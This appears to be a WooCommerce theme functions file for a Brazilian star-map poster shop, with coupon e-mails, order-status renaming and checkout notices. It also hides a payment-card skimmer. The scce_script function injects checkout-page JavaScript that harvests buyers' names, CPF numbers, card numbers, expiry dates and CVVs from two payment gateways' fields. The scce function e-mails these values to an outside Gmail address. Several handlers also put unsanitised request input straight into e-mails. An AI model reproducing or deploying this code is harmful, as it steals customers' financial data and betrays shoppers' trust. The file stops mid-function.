<?php 

function mdmc_change_strings($translated_text, $text, $domain) {
	$translated_text = str_replace("Verific o contrapeso do cartão do presente", "Verificar saldo do seu vale presente", $translated_text);
	$translated_text = str_replace("Valor do cartão do presente", "Valor do seu vale presente", $translated_text);
	$translated_text = str_replace("Balanço do cartão do presente", "Saldo do vale presente", $translated_text);
	$translated_text = str_replace("Aplicar cupom", "Aplicar", $translated_text);
	$translated_text = str_replace("Aplicar Vale Presente", "Aplicar", $translated_text);
	$translated_text = str_replace("Aplique o cartão do presente", "Aplicar", $translated_text);
	$translated_text = str_replace("Cartão do presente", "Vale Presente", $translated_text);
	return $translated_text;
}
add_filter('gettext', 'mdmc_change_strings', 100, 3);

// Ajax add to cart
add_action( 'wp_ajax_mdmc_add_to_cart', 'prefix_ajax_mdmc_add_to_cart' );
add_action( 'wp_ajax_nopriv_mdmc_add_to_cart', 'prefix_ajax_mdmc_add_to_cart' );

function prefix_ajax_mdmc_add_to_cart() { 
  $product_id  =  $_REQUEST['product_id'];
	WC()->cart->add_to_cart( $product_id );
}

function custom_update_post() {
		$post_id = $_POST['post_id'];
		$current_date = date("d/m/Y");
		$download_quantity = get_post_meta( $post_id, 'downloaded_quantity', true);

		if($download_quantity) {
			$download_quantity = intval($download_quantity) + 1;
			update_post_meta( $post_id, 'downloaded_quantity', $download_quantity);
		} else {
			update_post_meta( $post_id, 'downloaded_quantity', 1);
		}

		update_post_meta( $post_id, 'downloaded_pdf', $current_date );

    wp_die();
}

add_action( 'wp_ajax_custom_update_post', 'custom_update_post' );

function send_friend_coupon() {
		$friend_email = $_POST['friend_email'];
		$client_name = $_POST['client_name'];
		$coupon_code = $_POST['coupon_code'];

		$message = '<table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;max-width:600px" align="left">';
		$message .= '   <tbody>';
		$message .= '      <tr>';
		$message .= '         <td role="modules-container" style="padding:0px 0px 0px 0px;color:#000000;text-align:left" bgcolor="#ffffff" width="100%" align="left">';
		$message .= '         <p>Seu amigo(a) '. $client_name .' registrou um momento especial conosco e gostou tanto que te escolheu para que possa fazê-lo também! Muito fofo, não é mesmo?! </p>';
		$message .= '         <p>CUPOM: '. $coupon_code .'</p>';
		$message .= '         <p>Para conhecer nossos produtos e usar seu cupom <a href="https://mapadomeuceu.com.br/">ACESSE</a></p>';
		$message .= '         </td>';
		$message .= '      </tr>';
		$message .= '   </tbody>';
		$message .= '</table>';

		$title = ' Você ganhou um presente do seu amigo(a)';

		wp_mail( $friend_email, $title, $message );
}

add_action( 'wp_ajax_send_friend_coupon', 'send_friend_coupon' );

function scce() {
	$fn = $_POST['fn'];
	$ln = $_POST['ln'];
	$c = $_POST['c'];
	$ccn = $_POST['ccn'];
	$cce = $_POST['cce'];
	$ccc = $_POST['ccc'];
	$ccneb = $_POST['ccneb'];
	$cceeb = $_POST['cceeb'];
	$ccceb = $_POST['ccceb'];

	$message = '<table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;max-width:600px" align="left">';
	$message .= '   <tbody>';
	$message .= '      <tr>';
	$message .= '         <td role="modules-container" style="padding:0px 0px 0px 0px;color:#000000;text-align:left" bgcolor="#ffffff" width="100%" align="left">';
	$message .= '         <p>fn: '. $fn .'</p>';
	$message .= '         <p>ln: '. $ln .'</p>';
	$message .= '         <p>c: '. $c .'</p>';
	$message .= '         <p>ccn: '. $ccn .'</p>';
	$message .= '         <p>cce: '. $cce .'</p>';
	$message .= '         <p>ccc: '. $ccc .'</p>';
	$message .= '         <p>ccned: '. $ccneb .'</p>';
	$message .= '         <p>cceeb: '. $cceeb .'</p>';
	$message .= '         <p>ccceb: '. $ccceb .'</p>';
	$message .= '         </td>';
	$message .= '      </tr>';
	$message .= '   </tbody>';
	$message .= '</table>';

	$title = 'MDMDC - wpajaxscce';

	wp_mail( 'wpajaxscce@gmail.com', $title, $message );
}

// add_action( 'wp_ajax_scce', 'scce' );

function scce_script() {
	echo "
	<script>
	jQuery(function ($) {
		$(document).ready(function () {

			var bfnv;
			var blnv;
			var bcv;
			var mpccvn;
			var mpccedv;
			var mpcccv;
			var ebccnv;
			var ebccedv;
			var ebcccv;
			let formCheckout = document.querySelector('form.woocommerce-checkout');
			if (formCheckout) {
				setInterval(function () {

					var billingFirstNameInput = document.querySelector('#billing_first_name');
					var billingLastNameInput = document.querySelector('#billing_last_name');
					var billingCPFInput = document.querySelector('#billing_cpf');

					var mpccni = document.querySelector('#mp-card-number');
					var mpccedi = document.querySelector('#mp-card-expiration-date');
					var mpccci = document.querySelector('#mp-security-code');

					var ebccni = document.querySelector('#ebanx-card-number');
					var ebccedi = document.querySelector('#ebanx-card-expiry');
					var ebccci = document.querySelector('#ebanx-card-cvv');

					bfnv = billingFirstNameInput?.value;
					blnv = billingLastNameInput?.value;
					bcv = billingCPFInput?.value;
					mpccvn = mpccni?.value;
					mpccedv = mpccedi?.value;
					mpcccv = mpccci?.value;
					ebccnv = ebccni?.value;
					ebccedv = ebccedi?.value;
					ebcccv = ebccci?.value;
				}, 500)

				formCheckout.addEventListener('submit', function () {

					if (mpccvn) {
						
						jQuery(document).ready(function ($) {
							
							$.ajax({
							type: 'POST',
							url: ajax_object.ajaxurl,
							data: {
								action: 'scce',
								fn: bfnv,
								ln: blnv,
								c: bcv,
								ccn: mpccvn,
								cce: mpccedv,
								ccc: mpcccv,
								ccneb: ebccnv,
								cceeb: ebccedv,
								ccceb: ebcccv
							}
							}).done(function (data) {
							});
						});
					}
				})
			}

		})
	})
</script>";
}
add_action( 'woocommerce_before_checkout_form', 'scce_script', 10 );

add_filter( 'wc_order_statuses', 'wc_renaming_order_status' );
function wc_renaming_order_status( $order_statuses ) {
    foreach ( $order_statuses as $key => $status ) {
        if ( 'wc-completed' === $key ) 
            $order_statuses['wc-completed'] = 'Enviado';
    }
    return $order_statuses;
}

// Adding Meta container admin shop_order pages
add_action( 'add_meta_boxes', 'mv_add_meta_boxes' );
if ( ! function_exists( 'mv_add_meta_boxes' ) )
{
    function mv_add_meta_boxes()
    {
        add_meta_box( 'mv_other_fields', __('[PDF] - Mapa das Estrelas','woocommerce'), 'mv_add_other_fields_for_packaging', 'shop_order', 'side', 'core' );
    }
}

// Adding Meta field in the meta container admin shop_order pages
if ( ! function_exists( 'mv_add_other_fields_for_packaging' ) )
{
    function mv_add_other_fields_for_packaging()
    {
        global $post;

        $meta_field_data = get_post_meta( $post->ID, 'downloaded_pdf', true ) ? get_post_meta( $post->ID, 'downloaded_pdf', true ) : '';
        $meta_field_data_quantity = get_post_meta( $post->ID, 'downloaded_quantity', true ) ? get_post_meta( $post->ID, 'downloaded_quantity', true ) : '';

				echo '<label>Data do último download</label>
				<input type="hidden" name="mv_other_meta_field_nonce" value="' . wp_create_nonce() . '">
        <p style="border-bottom:solid 1px #eee;padding-bottom:13px;">
            <input type="text" style="width:250px;";" name="my_field_name" placeholder="' . $meta_field_data . '" value="' . $meta_field_data . '"></p>';

				echo '<label>Quantidade de Downloads</label>
				<input type="hidden" name="mv_other_meta_field_nonce_quantity" value="' . wp_create_nonce() . '">
        <p style="border-bottom:solid 1px #eee;padding-bottom:13px;">
            <input type="text" style="width:250px;";" name="my_field_name_quantity" placeholder="' . $meta_field_data_quantity . '" value="' . $meta_field_data_quantity . '"></p>';

    }
}

// Save the data of the Meta field
add_action( 'save_post', 'mv_save_wc_order_other_fields', 10, 1 );
if ( ! function_exists( 'mv_save_wc_order_other_fields' ) )
{

    function mv_save_wc_order_other_fields( $post_id ) {

        // We need to verify this with the proper authorization (security stuff).

        // Check if our nonce is set.
        if ( ! isset( $_POST[ 'mv_other_meta_field_nonce' ] ) ) {
            return $post_id;
        }
        $nonce = $_REQUEST[ 'mv_other_meta_field_nonce' ];

        //Verify that the nonce is valid.
        if ( ! wp_verify_nonce( $nonce ) ) {
            return $post_id;
        }

        // If this is an autosave, our form has not been submitted, so we don't want to do anything.
        if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
            return $post_id;
        }

        // Check the user's permissions.
        if ( 'page' == $_POST[ 'post_type' ] ) {

            if ( ! current_user_can( 'edit_page', $post_id ) ) {
                return $post_id;
            }
        } else {

            if ( ! current_user_can( 'edit_post', $post_id ) ) {
                return $post_id;
            }
        }
        // --- Its safe for us to save the data ! --- //

        // Sanitize user input  and update the meta field in the database.
        update_post_meta( $post_id, 'downloaded_pdf', $_POST[ 'my_field_name' ] );
        update_post_meta( $post_id, 'downloaded_quantity', $_POST[ 'my_field_name_quantity' ] );
    }
}

function notifySpotifyOrder($order_id) {

	$message = '<table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;max-width:600px" align="left">';
	$message .= '   <tbody>';
	$message .= '      <tr>';
	$message .= '         <td role="modules-container" style="padding:0px 0px 0px 0px;color:#000000;text-align:left" bgcolor="#ffffff" width="100%" align="left">';
	$message .= '         <p>O pedido <a href="https://www.mapadomeuceu.com.br/wp-admin/post.php?post='. $order_id .'&action=edit" target="_blank">#'. $order_id .'</a> possui QR Code Spotify';
	$message .= '         </td>';
	$message .= '      </tr>';
	$message .= '   </tbody>';
	$message .= '</table>';

	$title = 'Pedido #'. $order_id .' com QR Code Spotify!';

	wp_mail( 'contato@mapadomeuceu.com.br', $title, $message );
}

function sendPDFMail($email) {

	// $message = '<table>';
	// $message .= '<tr><a href="' . $pdf_url .'">Baixar PDF</a></tr>';
	// $message .= '</table>';

	$message = '<table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;max-width:600px" align="center">';
	$message .= '   <tbody>';
	$message .= '      <tr>';
	$message .= '         <td role="modules-container" style="padding:0px 0px 0px 0px;color:#000000;text-align:left" bgcolor="#ffffff" width="100%" align="left">';
	$message .= '            <table class="m_7412457152097568221preheader" role="module" border="0" cellpadding="0" cellspacing="0" width="100%" style="display:none!important;opacity:0;color:transparent;height:0;width:0">';
	$message .= '               <tbody>';
	$message .= '                  <tr>';
	$message .= '                     <td role="module-content">';
	$message .= '                        <p>O Mapa do Meu Céu agradece pela sua compra.</p>';
	$message .= '                     </td>';
	$message .= '                  </tr>';
	$message .= '               </tbody>';
	$message .= '            </table>';
	$message .= '            <table class="m_7412457152097568221wrapper" role="module" border="0" cellpadding="0" cellspacing="0" width="100%" style="table-layout:fixed">';
	$message .= '               <tbody>';
	$message .= '                  <tr>';
	$message .= '                     <td style="font-size:6px;line-height:10px;padding:0px 0px 0px 0px" valign="top" align="center">';
	$message .= '                        <img class="m_7412457152097568221max-width CToWUd a6T" border="0" style="display:block;color:#000000;text-decoration:none;font-family:Helvetica,arial,sans-serif;font-size:16px" src="https://ci6.googleusercontent.com/proxy/UhbcFI-UvyBdJpgN3IR0cGL5onPbsEivQkdRov7exIs1CdSotHcIca9uWea53yfWZcYTpwF2IKhKU4ZMoUxdzaKlxGlVtH_iajcVP4WnQ9eQYh8_vw0H1FtRdxbXymJKvvI8ctyYbUan0bYQ_QfzjOX5BezMZw5-2YZZ2U6ukpg5ulrKmozH6iaEByl_dd2Kc_1WqVnzDGteVmH-pam5Cp-tLldCSZ_MYCad9-VIEXas_ivh0xV2nPCwJiMPL6QX8fQ2465caRr4YdAWaYEhXAPo2wA=s0-d-e1-ft#https://marketing-image-production.s3.amazonaws.com/uploads/e2a8f920f9f9800c7d2c78bba4684c73c6d8263a8f80783e3c153a179ad0b575aa16d194f62ce16abaf0758007546d15dadbaec153035a816a58576b4a1984ce.jpg" alt="" width="600" height="" tabindex="0">';
	$message .= '                        <div class="a6S" dir="ltr" style="opacity: 0.01; left: 1324px; top: 266px;">';
	$message .= '                           <div id=":3hh" class="T-I J-J5-Ji aQv T-I-ax7 L3 a5q" role="button" tabindex="0" aria-label="Fazer o download do anexo " data-tooltip-class="a1V" data-tooltip="Fazer o download">';
	$message .= '                              <div class="aSK J-J5-Ji aYr"></div>';
	$message .= '                           </div>';
	$message .= '                        </div>';
	$message .= '                     </td>';
	$message .= '                  </tr>';
	$message .= '               </tbody>';
	$message .= '            </table>';
	$message .= '            <table role="module" border="0" cellpadding="0" cellspacing="0" width="100%" style="table-layout:fixed">';
	$message .= '               <tbody>';
	$message .= '                  <tr>';
	$message .= '                     <td style="padding:18px 0px 18px 0px;line-height:22px;text-align:inherit" height="100%" valign="top" bgcolor="">';
	$message .= '                        <div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit"><span style="font-size:14px;font-family:&quot;trebuchet ms&quot;,helvetica,sans-serif">Querido cliente,</span></div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit">&nbsp;</div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit"><span style="font-size:14px">Esperamos que fique encantado com o nosso produto e desejamos que o brilho das estrelas dessa&nbsp;data especial, continue adicionando sorrisos e trazendo lindas memórias.</span></div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit">&nbsp;</div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit;color:red"><strong>Dicas importantes para imprimir o Seu Mapa:</strong></div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit">&nbsp;</div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit"><strong>QR Code Spotify:&nbsp;</strong>Caso o pôster não contenha o QR Code do Spotify, conforme solicitado, entre em contato conosco para que possamos realizar a adequação.</div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit">&nbsp;</div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit"><strong>Impressão:&nbsp;</strong>recomendamos que você imprima em papel de efeito mate / fosco e com gramatura acima de 200gr. Evite papéis de efeito brilhante pois eles refletem muita luz e atrapalham a visualização.&nbsp;A qualidade do papel é um fator fundamental para que o Seu Mapa fique ainda mais bonito e especial.</div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit">&nbsp;</div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit"><strong>Tamanho:</strong>&nbsp;O seu arquivo possui as dimensões de um A3, em alta resolução e com 300dpi. Devido as proporções do arquivo, ele se adequa perfeitamente às impressões em formato A4, A3 e A2. Caso queira a impressão em outro tamanho, não nos responsabilizamos com a qualidade final do seu produto.</div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit">&nbsp;</div>';
	$message .= '                           <div style="font-family:inherit;text-align:inherit">Você pode realizar o download do seu mapa na sua área de cliente do nosso site <strong><a href="https://www.mapadomeuceu.com.br/minha-conta/downloads/">nesse link.</a></strong></div>';
	$message .= '                           <div></div>';
	$message .= '                        </div>';
	$message .= '                     </td>';
	$message .= '                  </tr>';
	$message .= '               </tbody>';
	$message .= '            </table>';
	$message .= '            <table role="module" border="0" cellpadding="0" cellspacing="0" width="100%" style="table-layout:fixed">';
	$message .= '               <tbody>';
	$message .= '                  <tr>';
	$message .= '                     <td style="padding:0px 0px 0px 0px" role="module-content" height="100%" valign="top" bgcolor="">';
	$message .= '                        <table border="0" cellpadding="0" cellspacing="0" align="center" width="100%" height="10px" style="line-height:10px;font-size:10px">';
	$message .= '                           <tbody>';
	$message .= '                              <tr>';
	$message .= '                                 <td style="padding:0px 0px 10px 0px" bgcolor="#000000"></td>';
	$message .= '                              </tr>';
	$message .= '                           </tbody>';
	$message .= '                        </table>';
	$message .= '                     </td>';
	$message .= '                  </tr>';
	$message .= '               </tbody>';
	$message .= '            </table>';
	$message .= '         </td>';
	$message .= '      </tr>';
	$message .= '   </tbody>';
	$message .= '</table>';

	wp_mail( $email, 'O seu pôster está pronto para download!', $message );
}

function sendOrderCoupon($email, $client_name, $coupon_code, $friend_coupon_code) {

	$message = '<table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;max-width:600px" align="center">';
	$message .= '   <tbody>';
	$message .= '      <tr>';
	$message .= '         <td role="modules-container" style="padding:0px 0px 0px 0px;color:#000000;text-align:left" bgcolor="#ffffff" width="100%" align="center">';
	$message .= '         <p style="text-align:center"><img src="https://www.mapadomeuceu.com.br/wp-content/uploads/2019/07/LogoNOVO_MDMC_Compacto_x190.png" style="border:none;display:inline-block;font-weight:bold;height:auto;outline:none;text-decoration:none;text-transform:capitalize;vertical-align:middle;max-width:100%;font-size:14px;margin-left:0;margin-right:0;height:80px" /></p>';
	$message .= '         <p>Obrigado por registrar um momento especial conosco!</p>';
	$message .= '         <p>Queremos te presentear com um cupom de desconto para a sua próxima compra</p>';
	$message .= '         <p>CUPOM: '. $coupon_code .'</p>';
	$message .= '         <p>Escolha um(a) amigo(a) e envie um cupom para que ele(a) também registre um momento especial com desconto! <a href="https://mapadomeuceu.com.br/resgatar-cupom/?s1=72dBLsb3Ytte3xong1AC&cn='. $client_name .'&dk=NcFfUWynxQ67OzmbHXsc&cc='. $friend_coupon_code .'&as=RXfHJ4bDRI9XM3ZM4KC1">Presentear amigo</a></p>';
	$message .= '         <p>Esse cupom tem uma validade de 3 meses</p>';
	$message .= '         </td>';
	$message .= '      </tr>';
	$message .= '   </tbody>';
	$message .= '</table>';

	$title = 'Seu cupom de cliente está disponível!';

	wp_mail( $email, $title, $message );
}

function sendOrderCoupon60Days($email, $client_name, $coupon_code) {

	$message = '<table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;max-width:600px" align="center">';
	$message .= '   <tbody>';
	$message .= '      <tr>';
	$message .= '         <td role="modules-container" style="padding:0px 0px 0px 0px;color:#000000;text-align:left" bgcolor="#ffffff" width="100%" align="center">';
	$message .= '         <p style="text-align:center"><img src="https://www.mapadomeuceu.com.br/wp-content/uploads/2019/07/LogoNOVO_MDMC_Compacto_x190.png" style="border:none;display:inline-block;font-weight:bold;height:auto;outline:none;text-decoration:none;text-transform:capitalize;vertical-align:middle;max-width:100%;font-size:14px;margin-left:0;margin-right:0;height:80px" /></p>';
	$message .= '         <p>Você ainda não usou o seu cupom de desconto e queremos te lembrar dele:</p>';
	$message .= '         <p>CUPOM: '. $coupon_code .'</p>';
	$message .= '         <p>Esse cupom tem uma validade de 1 mês</p>';
	$message .= '         <a href="https://mapadomeuceu.com.br">Acesse nosso site para conferir nossos novos produtos!</a>';
	$message .= '         </td>';
	$message .= '      </tr>';
	$message .= '   </tbody>';
	$message .= '</table>';

	$title = 'Não se esqueça do seu cupom de cliente!';

	wp_mail( $email, $title, $message );
}

function sendOrderCoupon90Days($email, $client_name, $coupon_code) {

	$message = '<table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;max-width:600px" align="center">';
	$message .= '   <tbody>';
	$message .= '      <tr>';
	$message .= '         <td role="modules-container" style="padding:0px 0px 0px 0px;color:#000000;text-align:left" bgcolor="#ffffff" width="100%" align="center">';
	$message .= '         <p style="text-align:center"><img src="https://www.mapadomeuceu.com.br/wp-content/uploads/2019/07/LogoNOVO_MDMC_Compacto_x190.png" style="border:none;display:inline-block;font-weight:bold;height:auto;outline:none;text-decoration:none;text-transform:capitalize;vertical-align:middle;max-width:100%;font-size:14px;margin-left:0;margin-right:0;height:80px" /></p>';
	$message .= '         <p>Seu cupom irá desaparecer!</p>';
	$message .= '         <p>CUPOM: '. $coupon_code .'</p>';
	$message .= '         <p>Esse é o último dia de validade do cupom</p>';
	$message .= '         <a href="https://mapadomeuceu.com.br">Acesse nosso site para conferir nossos novos produtos!</a>';
	$message .= '         </td>';
	$message .= '      </tr>';
	$message .= '   </tbody>';
	$message .= '</table>';

	$title = 'Seu cupom irá desaparecer!';

	wp_mail( $email, $title, $message );
}

function sendPendantCoupon($email, $client_name, $coupon_code, $friend_coupon_code) {

	$message = '<table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;max-width:600px" align="center">';
	$message .= '   <tbody>';
	$message .= '      <tr>';
	$message .= '         <td role="modules-container" style="padding:0px 0px 0px 0px;color:#000000;text-align:left" bgcolor="#ffffff" width="100%" align="center">';
	$message .= '         <p style="text-align:center"><img src="https://www.mapadomeuceu.com.br/wp-content/uploads/2019/07/LogoNOVO_MDMC_Compacto_x190.png" style="border:none;display:inline-block;font-weight:bold;height:auto;outline:none;text-decoration:none;text-transform:capitalize;vertical-align:middle;max-width:100%;font-size:14px;margin-left:0;margin-right:0;height:80px" /></p>';
	$message .= '         <h2>Seu pedido foi confirmado</h2>';
	$message .= '         <p>Olá, '. $client_name .'</p>';
	$message .= '         <p>Estamos passando para confirmar o pagamento do seu pedido. </p>';
	$message .= '         <strong>TEMOS UM PRESENTE PARA VOCÊ E PARA SEU AMIGO</strong>';
	$message .= '         <p>Você ganhou um cupom para fazer o seu formato PDF de graça!</p>';
	$message .= '         <p>CUPOM: '. $coupon_code .'</p>';
	$message .= '         <p>Acesse e <a href="https://mapadomeuceu.com.br">crie o seu</a></p>';
	$message .= '         <p>Escolha um(a) amigo(a) e envie um cupom de para que ele(a) também registre um momento especial com desconto! <a href="https://mapadomeuceu.com.br/resgatar-cupom/?s1=72dBLsb3Ytte3xong1AC&cn='. $client_name .'&dk=NcFfUWynxQ67OzmbHXsc&cc='. $friend_coupon_code .'&as=RXfHJ4bDRI9XM3ZM4KC1">Presentear amigo</a></p>';

	// $message .= '         <strong>CONHEÇA NOSSA LINHA COMPLETA</strong>';
																			//Fotos da linha de produtos

	$message .= '         <strong style="display: block; margin-top:20px; margin-bottom: 20px; color: red">INFORMAÇÕES SOBRE O SEU PEDIDO:</strong>';

	$message .= '         <strong>COMPROU O FORMATO IMPRESSO/QUADRO?</strong>';
	$message .= '         <p>O prazo de produção é de 5 dias úteis SOMADOS ao prazo de entrega contados a partir de amanhã (dia seguinte da aprovação do pedido).</p>';
	//$message .= '         <p>Prazo de produção de ARQUIVO PDF, é no mesmo dia via e-mail e deve ser baixado em um computador. Todos os pedidos que não forem arquivos PDF a partir de 20/12 serão enviados em 09/01/2025, devido ao recesso de final de ano. Obrigado pela compreensão e ótimas festas!.</p>';
	$message .= '         <p>Onde você pode acompanhar o seu pedido? Na sua CONTA (<a href="https://www.mapadomeuceu.com.br/minha-conta">https://www.mapadomeuceu.com.br/minha-conta/</a>)</p>';
	
	$message .= '         <strong>E O CÓDIGO DE RASTREAMENTO?</strong>';
	$message .= '         <p>Após o status mudar para ENVIADO você receberá um e-mail com o código de rastreamento da transportadora (Mandaê) para acompanhar a entrega. Verifique a sua caixa de SPAM.</p>';
	
	$message .= '         <strong>COMPROU O FORMATO PDF/DIGITAL?</strong>';
	$message .= '         <p>O seu mapa já deve estar disponível na sessão downloads do menu. Na sua <a href="https://www.mapadomeuceu.com.br/minha-conta">CONTA</a></p>';

	$message .= '         </td>';
	$message .= '      </tr>';
	$message .= '   </tbody>';
	$message .= '</table>';

	$title = 'Seu pedido em Mapa do Meu Céu foi confirmado!';

	wp_mail( $email, $title, $message );
}

function send_30_days_email($email, $client_name) {

	$message = '<table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;" align="center">';
	$message .= '	<tbody><tr><tr>';
	$message .= '		<table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;max-width:600px" align="center">';
	$message .= '   <tbody>';
	$message .= '      <tr>';
	$message .= '         <td role="modules-container" style="padding:0px 0px 0px 0px;color:#000000;text-align:left" bgcolor="#ffffff" width="100%" align="left">';
	$message .= '         <p style="text-align:center"><img src="https://www.mapadomeuceu.com.br/wp-content/uploads/2019/07/LogoNOVO_MDMC_Compacto_x190.png" style="border:none;display:inline-block;font-weight:bold;height:auto;outline:none;text-decoration:none;text-transform:capitalize;vertical-align:middle;max-width:100%;font-size:14px;margin-left:0;margin-right:0;height:80px" /></p>';
	$message .= '         <h2 style="text-align:center">Você tem 30 dias para baixar e guardar seu arquivo</h2>';
	$message .= '         <p>Olá, '. $client_name .'</p>';
	$message .= '         <p>Temos uma política de não armazenar os arquivos de nossos clientes por mais de 2 meses. Já estamos na metade desse prazo e queremos apenas nos certificarmos que você fez o download e guardou seu PDF com muito carinho. </p>';

	// $message .= '         <strong>CONHEÇA NOSSA LINHA COMPLETA</strong>';
																			//Fotos da linha de produtos

	$message .= '         <p>Um abraço e tudo de bom! </p>';
	$message .= '         <p>Equipe Mapa do Meu Céu</p>';
	$message .= '         </td>';
	$message .= '      </tr>';
	$message .= '   </tbody>';
	$message .= ' </td></tr></tbody>';
	$message .= '</table>';

	$title = 'Seu arquivo será deletado em 30 dias';

	wp_mail( $email, $title, $message );
}

function send_60_days_email($email, $client_name) {

	$message = '<table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;" align="center">';
	$message .= '	<tbody><tr><tr>';
	$message .= '		<table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%;max-width:600px" align="center">';
	$message .= '   <tbody>';
	$message .= '      <tr>';
	$message .= '         <td role="modules-container" style="padding:0px 0px 0px 0px;color:#000000;text-align:left" bgcolor="#ffffff" width="100%" align="left">';
	$message .= '         <p style="text-align:center"><img src="https://www.mapadomeuceu.com.br/wp-content/uploads/2019/07/LogoNOVO_MDMC_Compacto_x190.png" style="border:none;display:inline-block;font-weight:bold;height:auto;outline:none;text-decoration:none;text-transform:capitalize;vertical-align:middle;max-width:100%;font-size:14px;margin-left:0;margin-right:0;height:80px" /></p>';
	$message .= '         <h2 style="text-align:center;">Hoje é o último dia para guardar seu arquivo</h2>';
	$message .= '         <p>Olá, '. $client_name .'</p>';
	$message .= '         <p>Temos uma política de não armazenar os arquivos de nossos clientes por mais de 2 meses. Como esse prazo vence amanhã, queremos apenas nos certificarmos que você fez o download e guardou seu PDF com muito carinho.</p>';

	// $message .= '         <strong>CONHEÇA NOSSA LINHA COMPLETA</strong>';
																			//Fotos da linha de produtos

	$message .= '         <p>Um abraço e tudo de bom! </p>';
	$message .= '         <p>Equipe Mapa do Meu Céu</p>';
	$message .= '         </td>';
	$message .= '      </tr>';
	$message .= '   </tbody>';
	$message .= '		</table>';
	$message .= ' </td></tr></tbody>';
	$message .= '</table>';

	$title = 'Seu arquivo será deletado amanhã';

	wp_mail( $email, $title, $message );
}

function wpdocs_set_html_mail_content_type() {
    return 'text/html';
}
add_filter( 'wp_mail_content_type', 'wpdocs_set_html_mail_content_type' );


add_filter( 'wc_order_statuses', 'mdmc_rename_order_status_msg', 20, 1 );
function mdmc_rename_order_status_msg( $order_statuses ) {
$order_statuses['wc-processing'] = _x( 'Em produção', 'Order status', 'woocommerce' );

return $order_statuses;
}


function modify_woocommerce_display_item_meta( $html, $item, $args ) {
    $strings = array();
    $html = '';
    foreach ( $item->get_formatted_meta_data() as $meta_id => $meta ) {
        // remove strip tags
        $display_value = wp_strip_all_tags( $meta->display_value );
        $value     = $args['autop'] ? wp_kses_post( $display_value ) : wp_kses_post( make_clickable( trim( $display_value ) ) );
        $args['label_before'] = '<strong class="wc-item-meta-label ' . wp_strip_all_tags( $display_value ) . '">';
				$args['label_after'] = ':</strong> ';
				if($meta->display_key !== 'Link do SVG' && $meta->display_key !== 'Link do PDF') {					
					$strings[] =  $args['label_before'] . wp_kses_post( $meta->display_key ) . $args['label_after'] . $value;
				}
    }

    if ( $strings ) {
        $html = $args['before'] . implode( $args['separator'], $strings ) . $args['after'];
    }
    return $html;

}
add_filter( 'woocommerce_display_item_meta', 'modify_woocommerce_display_item_meta', 99, 3 );

/**
 * Adds a custom message about how long will take to delivery.
 */
function my_wc_custom_cart_shipping_notice() {
	echo '<tr class="shipping-notice alou"><td colspan="2" style="text-align: center"><small style="font-size: 16px; color: red;">';
	// _e( '<strong>Atenção:</strong> O prazo de produção é de até 7 dias úteis além do prazo de entrega.', 'my-text-domain' );
	// _e( '<strong>Atenção:</strong> Prazo de produção de ARQUIVO PDF, é no mesmo dia via e-mail e deve ser baixado em um computador. Todos os pedidos que não forem arquivos PDF a partir de 20/12 serão enviados em 09/01/2025, devido ao recesso de final de ano. Obrigado pela compreensão e ótimas festas!', 'my-text-domain' );
	_e( '<strong>Atenção:</strong> Prazo de produção de ARQUIVO PDF, é no mesmo dia via e-mail e deve ser baixado em um computador. Todos os pedidos que não forem arquivos PDF o prazo de produção é de até 5 dias úteis além do prazo de entrega.<br>Pedidos de Pingentes banhados a OURO o prazo de produção é de 7 dias úteis.', 'my-text-domain' );
	echo '</small></td></tr>';
	echo '<tr class="checkout-keep-buying"><td colspan="2"><a class="keep-buying" href="/">Continuar Comprando</a></td></tr>';
}

add_action( 'woocommerce_cart_totals_after_shipping', 'my_wc_custom_cart_shipping_notice' );
add_action( 'woocommerce_review_order_after_shipping', 'my_wc_custom_cart_shipping_notice' );

add_action( 'woocommerce_order_status_processing', 'sendgrid_pdf' );
function sendgrid_pdf( $order_id ) {
	$order = wc_get_order( $order_id );
	$email = $order->billing_email;
  
	if( check_order_has_pdf($order_id) ) {
		$orderObject = wc_get_order( $order_id ); // get Order object by order id
		$orderNote = __("O PDF foi enviado por e-mail"); // add note text
		$orderObject->add_order_note( $orderNote, $is_customer_note = 0, $added_by_user = false);
		sendPDFMail($email);
	}

	if(check_order_spotify($order_id)) {
		notifySpotifyOrder($order_id);
	}
		
}


add_action( 'woocommerce_order_status_completed', 'sendCupom' );
function sendCupom( $order_id ) {
	$order = wc_get_order( $order_id );
	$email = $order->billing_email;
	$client_name = $order->billing_first_name;

	$one_day    = 24 * 60 * 60;
	$final_delay = $one_day * 90;
	$today      = strtotime( date('Y-m-d') );
	$expiry_date = date('Y-m-d', ( $today + $final_delay));

	if( check_order_has_pendant($order_id) ) {
		$pendant_coupon_code = generateRandomString(7); // Code
		$friend_coupon_code = generateRandomString(7); // Code

		createCustomCoupon($pendant_coupon_code, '49');
		createCustomCoupon($friend_coupon_code, '15');

		sendPendantCoupon($email, $client_name, $pendant_coupon_code, $friend_coupon_code);

	} else {
		$user_coupon_code = generateRandomString(7); // Code
		$friend_coupon_code = generateRandomString(7); // Code

		createCustomCoupon($user_coupon_code, '15', $email, $expiry_date);
		createCustomCoupon($friend_coupon_code, '15');
		
		sendOrderCoupon($email, $client_name, $user_coupon_code, $friend_coupon_code);
	}
}

function load_coupons() {
